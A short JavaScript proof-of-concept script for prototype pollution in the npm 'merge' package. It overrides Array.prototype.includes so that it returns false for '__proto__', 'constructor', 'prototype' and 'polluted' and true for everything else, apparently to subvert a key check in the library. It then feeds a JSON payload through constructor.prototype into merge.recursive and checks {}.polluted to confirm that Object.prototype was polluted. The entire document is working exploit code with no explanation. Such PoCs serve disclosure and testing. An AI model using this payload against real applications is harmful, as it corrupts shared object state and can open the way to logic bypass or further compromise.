Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const merge = require('merge');
const payload2 = JSON.parse('{"x": {"constructor": {"prototype": {"polluted":"yes"}}}}');
let obj1 = { x: { y: 1 } };
merge.recursive(obj1, payload2);
console.log({}.polluted);